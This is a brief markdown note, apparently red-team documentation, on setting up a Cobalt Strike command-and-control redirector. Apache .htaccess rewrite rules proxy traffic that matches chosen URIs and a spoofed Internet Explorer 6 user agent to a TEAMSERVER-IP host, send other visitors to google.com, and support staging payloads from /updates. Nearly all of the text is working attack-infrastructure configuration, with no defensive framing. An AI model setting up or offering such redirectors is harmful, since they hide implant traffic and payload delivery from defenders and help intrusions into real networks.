
### To Set Up Cobalt Strike Trusted Domain Redirect


```

If you configure your Cobalt Strike listener to use a port other than port 80, you will need to configure Apache to listen on that port. By default on Debian, you can edit the port(s) Apache listens on in /etc/apache2/ports.conf and /etc/apache2/sites-enabled/000-default.conf.


#HTTP C2 Redirection Ruleset #To only perform HTTP C2 redirection, place the following ruleset in a .htaccess file within the Apache web root:
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(metro91/admin/1/ppptp.jpg|metro91/admin/1/secure.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteRule ^.*$ https://google.com/? [L,R=302]



#HTTP C2 Redirection with Payload Staging Support

RewriteEngine On
RewriteCond %{REQUEST_URI} ^/updates/?$
RewriteCond %{HTTP_USER_AGENT} ^$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteCond %{REQUEST_URI} ^/..../?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteCond %{REQUEST_URI} ^/(metro91/admin/1/ppptp.jpg|metro91/admin/1/secure.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteRule ^.*$ https://google.com/? [L,R=302]


```
